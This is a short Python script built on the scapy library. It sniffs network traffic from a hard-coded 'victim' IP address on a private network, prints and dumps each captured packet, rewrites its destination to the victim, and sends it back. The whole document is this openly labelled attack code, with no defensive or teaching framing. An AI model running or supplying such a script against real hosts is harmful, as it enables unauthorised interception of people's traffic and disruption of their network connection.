from scapy.all import sniff, send
from scapy.layers.inet import IP

# Define the victim's IP address
victim_ip = "192.168.3.104"

def packet_callback(packet):
    if packet.haslayer(IP) and packet[IP].src == victim_ip:
        print(f"Captured packet from {victim_ip} to {packet[IP].dst}")
        packet.show()
        # Modify the packet's destination to the victim's IP
        packet[IP].dst = victim_ip
        # Send the modified packet back to the victim
        send(packet)
        print(f"Forwarded packet back to {victim_ip}")

# Sniff packets on the network and use packet_callback to process them
sniff(filter=f"ip src {victim_ip}", prn=packet_callback, store=0)


